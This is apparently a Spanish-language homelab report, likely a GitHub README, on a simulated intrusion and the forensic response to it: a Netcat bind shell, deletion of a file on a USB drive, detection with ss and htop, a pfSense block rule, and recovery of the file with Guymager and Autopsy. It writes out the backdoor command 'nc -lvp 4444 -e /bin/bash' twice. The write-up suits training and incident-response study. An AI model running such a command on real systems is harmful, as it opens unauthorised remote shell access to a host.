Homelab ciberseguridad

Este informe documenta la simulación de ataque, respuesta a incidentes y análisis forense digital realizado sobre un activo de la red corporativa. Durante el incidente, un atacante estableció una conexión de reversa (backdoor) mediante Netcat, eliminando un archivo confidencial (Plan_Estrategico.pdf) en una unidad extraíble. La amenaza fue detectada en tiempo real, contenida mediante reglas en el cortafuegos pfSense y analizada mediante herramientas forenses para la recuperación exitosa de la evidencia.

Informe Técnico del Incidente

1. Fase de Explotación e Intrusión (Red Team)
Establecimiento del acceso: Se ejecutó el comando nc -lvp 4444 -e /bin/bash en el sistema para habilitar una puerta trasera en el puerto TCP 4444.   
Conexión remota: El atacante se conectó desde la dirección IP 192.168.1.100 hacia el puerto remoto 4444 en el equipo víctima (192.168.1.101).   
Destrucción de datos: Utilizando la shell interactiva, el atacante accedió al punto de montaje /media/gabo-cs/TEST (/dev/sdb1) y procedió al borrado del archivo Plan_Estrategico.pdf.

2. Detección y Contención de Incidentes (Blue Team)
Monitoreo de procesos y sockets: Se identificó el proceso sospechoso bash -i mediante htop y se corroboró la conexión en estado ESTAB utilizando el comando ss -atn hacia 192.168.1.101:4444.
Aislamiento de la red: Se configuró una regla de bloqueo en la interfaz LAN de pfSense denegando todo tráfico TCP proveniente de la IP 192.168.1.101 hacia el puerto 4444 ("Bloqueo puerta trasera").

3.  Adquisición Forense y Análisis (DFIR)
Gestión de contingencia de almacenamiento: Durante el intento inicial de clonación con dd, la partición principal (/dev/sda2) alcanzó el 100% de su capacidad. La adquisición se completó exitosamente migrando a Kali Linux con la herramienta Guymager.
Adquisición bit a bit: Se generó la imagen RAW /home/kali/Desktop/CASO/evidencia_caso.dd desde el dispositivo /dev/sdb con verificación de integridad aprobada.
Análisis con Autopsy: Se creó el caso Caso_Final en Autopsy v2.24 para examinar la partición FAT32.
Recuperación de la evidencia: Se localizó la entrada de directorio no asignada _LAN_E~1.PDF con un tamaño de 612,108 bytes. Tras verificar su firma de encabezado %PDF-1.3, el documento fue extraído y visualizado correctamente en el sistema.


📊 Tabla de Evidencias y Cadena de Custodia
---------------------------------------------------------------------------------------

Parámetro / Componente Detalles de la Evidencia 

IP Atacante / Listener192.168.1.100  

IP Víctima / Objetivo192.168.1.101  

Puerto Comprometido4444 (TCP)  

Comando Maliciosonc -lvp 4444 -e /bin/bash  

Dispositivo de Almacenamiento/dev/sdb1 (Formato FAT32) 

Archivo EliminadoPlan_Estrategico.pdf (_LAN_E~1.PDF)  

Tamaño del Archivo612,108 bytes   

Hash MD5 del Contenido Recuperado3cc93ebe0572d0e22124be471aadf286   

Hash SHA-1 del Contenido Recuperado08a34a566b1459fe3c020c90d7c1c067b083ec16  

Imagen Forense Generadaevidencia_caso.dd (vía Guymager)   

Herramientas UtilizadasNetcat, ss, htop, pfSense, Guymager, Autopsy   

Estado de Recuperación ✅ Completado y Verificado

---------------------------------------------------------------------------------------



<img width="1305" height="768" alt="Captura de pantalla 2026-05-08 112546" src="https://github.com/user-attachments/assets/d2232082-a657-4361-a1ba-0992ed782a09" />
<img width="1126" height="648" alt="Captura de pantalla 2026-05-08 112530" src="https://github.com/user-attachments/assets/ba1539d4-25aa-4259-a10d-c7406c944902" />
<img width="1317" height="657" alt="Captura de pantalla 2026-05-08 112339" src="https://github.com/user-attachments/assets/0ee114cd-646b-45f9-aae8-076f8b2867ec" />
<img width="951" height="440" alt="Captura de pantalla 2026-05-08 112207" src="https://github.com/user-attachments/assets/a8323b33-02c7-47e4-a2f4-ac421bf22e0e" />
<img width="532" height="524" alt="Captura de pantalla 2026-05-08 111921" src="https://github.com/user-attachments/assets/850bc1f0-8314-4846-91a1-d21eef981dee" />
<img width="1095" height="478" alt="Captura de pantalla 2026-05-08 111816" src="https://github.com/user-attachments/assets/ee9323bb-0591-45d2-89b0-6bf93027ce7c" />
<img width="716" height="525" alt="Captura de pantalla 2026-05-08 111629" src="https://github.com/user-attachments/assets/4de663f6-6847-43d7-8efb-1f38524373b8" />
<img width="1198" height="515" alt="Captura de pantalla 2026-05-08 111619" src="https://github.com/user-attachments/assets/e67c59a1-b5a7-4b67-a16c-8260cbc3130e" />
<img width="1272" height="676" alt="Captura de pantalla 2026-05-08 110828" src="https://github.com/user-attachments/assets/3b8ff09e-80de-4ff6-903a-e1d77fa307ba" />
<img width="754" height="478" alt="Captura de pantalla 2026-05-08 110559" src="https://github.com/user-attachments/assets/38abb5a3-6f50-436e-b18e-d32cb2572251" />
<img width="998" height="527" alt="Captura de pantalla 2026-05-07 184747" src="https://github.com/user-attachments/assets/524a68c2-5815-4ebc-b683-74444219dcfc" />
<img width="1038" height="555" alt="Captura de pantalla 2026-05-07 181447" src="https://github.com/user-attachments/assets/25f7d16a-16bf-4947-a232-f35e024bee6a" />
<img width="588" height="138" alt="Captura de pantalla 2026-05-07 115440" src="https://github.com/user-attachments/assets/16979ede-2044-41e0-8dfc-91e6f9f2a6bb" />
<img width="1532" height="184" alt="Captura de pantalla 2026-05-07 115149" src="https://github.com/user-attachments/assets/e18f1fad-f998-42ea-873b-3dc9c150dd98" />
<img width="1632" height="323" alt="Captura de pantalla 2026-05-07 114009" src="https://github.com/user-attachments/assets/1c901254-ca80-458f-8bee-305830d84d80" />
<img width="1143" height="840" alt="Captura de pantalla 2026-05-07 113038" src="https://github.com/user-attachments/assets/e1ae335a-dc66-4e22-8d95-f92828e2fc3b" />
<img width="1543" height="890" alt="Captura de pantalla 2026-05-07 112018" src="https://github.com/user-attachments/assets/7b9d9be2-10bc-41b9-9896-94abf14cb313" />
<img width="1178" height="518" alt="Captura de pantalla 2026-05-07 111918" src="https://github.com/user-attachments/assets/5478987c-3802-46a3-8303-5b3af9f18e16" />
<img width="943" height="629" alt="Captura de pantalla 2026-05-07 110023" src="https://github.com/user-attachments/assets/f1cf8aaf-70dd-4805-a735-d7e94b731409" />
<img width="1463" height="791" alt="Captura de pantalla 2026-05-07 105818" src="https://github.com/user-attachments/assets/a8ce2857-d4c9-4024-b60a-473bd4b0e58a" />
<img width="932" height="553" alt="Captura de pantalla 2026-05-07 105453" src="https://github.com/user-attachments/assets/ce906c5d-1b24-49be-a291-afdaa67e8493" />
<img width="1919" height="1030" alt="Captura de pantalla 2026-05-07 104947" src="https://github.com/user-attachments/assets/78fe7ed2-b2ba-4cad-a9f6-f5f13dfa2ceb" />
<img width="699" height="388" alt="Captura de pantalla 2026-05-07 104701" src="https://github.com/user-attachments/assets/27db1191-ff6e-4d20-b593-3d6bb7210e6d" />
<img width="667" height="356" alt="Captura de pantalla 2026-05-07 104609" src="https://github.com/user-attachments/assets/f071106b-2578-4218-a067-e54d455d7a3a" />
<img width="613" height="129" alt="Captura de pantalla 2026-05-07 104507" src="https://github.com/user-attachments/assets/f00ea1af-b73a-4e1f-bb4c-321c2fcec100" />
<img width="574" height="451" alt="Captura de pantalla 2026-05-07 102311" src="https://github.com/user-attachments/assets/9202ba9a-4921-4f17-bf99-e1cc86daa94f" />
<img width="923" height="476" alt="Captura de pantalla 2026-05-07 102228" src="https://github.com/user-attachments/assets/39913be7-205c-4ec0-b619-e999d4d5c8a0" />
<img width="364" height="112" alt="Captura de pantalla 2026-05-07 102110" src="https://github.com/user-attachments/assets/8c32b6b9-9d5a-46ae-ac2f-9f6351cd2d9c" />
<img width="363" height="82" alt="Captura de pantalla 2026-05-07 101927" src="https://github.com/user-attachments/assets/a19b4b3e-3a93-4039-9bf5-8c9a663984de" />
<img width="554" height="82" alt="Captura de pantalla 2026-05-07 101752" src="https://github.com/user-attachments/assets/fbff001d-a8b8-4553-ba7a-fb941ed4d33d" />
<img width="1042" height="142" alt="Captura de pantalla 2026-05-07 101645" src="https://github.com/user-attachments/assets/da5cdb1f-efd5-4fcd-9814-d745c55646ec" />
<img width="1026" height="191" alt="Captura de pantalla 2026-05-07 101532" src="https://github.com/user-attachments/assets/4289b98a-20cb-4358-90ca-ca60bca5242b" />
<img width="866" height="191" alt="Captura de pantalla 2026-05-07 101116" src="https://github.com/user-attachments/assets/edfe1e65-c430-4653-be21-81b531736c61" />
<img width="583" height="84" alt="Captura de pantalla 2026-05-07 100955" src="https://github.com/user-attachments/assets/2528fb5c-e26c-4664-9809-78b0cb94a9ce" />
<img width="1311" height="797" alt="Captura de pantalla 2026-05-07 100759" src="https://github.com/user-attachments/assets/04cdf97d-7091-4a87-872a-c276190b1899" />
<img width="859" height="411" alt="Captura de pantalla 2026-05-07 094722" src="https://github.com/user-attachments/assets/a8315a8c-662e-42d3-bcf2-9a7507face3b" />
<img width="1080" height="769" alt="Captura de pantalla 2026-05-07 094505" src="https://github.com/user-attachments/assets/7b04a209-cd67-45b9-91b4-00152e0985cd" />
<img width="1040" height="335" alt="Captura de pantalla 2026-05-07 094451" src="https://github.com/user-attachments/assets/2a47c2c1-a14b-45cc-8568-ffacd0a5268d" />
<img width="1048" height="764" alt="Captura de pantalla 2026-05-07 094422" src="https://github.com/user-attachments/assets/c30d73e9-a16f-4b81-b0f3-f8253a82b596" />
<img width="700" height="123" alt="Captura de pantalla 2026-05-07 094243" src="https://github.com/user-attachments/assets/20cebe11-6cac-4d0f-8f25-6e64bfd08be0" />
<img width="1004" height="602" alt="Captura de pantalla 2026-05-07 093436" src="https://github.com/user-attachments/assets/f558208f-f558-400b-9bd9-5c43c4b9939d" />
<img width="1151" height="629" alt="Captura de pantalla 2026-05-07 093424" src="https://github.com/user-attachments/assets/ba4cdc8f-e74e-4d3a-9f37-3c80d0af453a" />
<img width="818" height="267" alt="Captura de pantalla 2026-05-07 091153" src="https://github.com/user-attachments/assets/478926fa-2206-4971-ba3c-bf8b225a7888" />
<img width="1020" height="625" alt="Captura de pantalla 2026-05-07 091135" src="https://github.com/user-attachments/assets/4c3ac23b-ef91-4d38-bec3-7e86451de209" />
<img width="658" height="115" alt="Captura de pantalla 2026-05-08 114832" src="https://github.com/user-attachments/assets/ada7f1a0-6aba-4c94-94b5-479a2aaa6f45" />
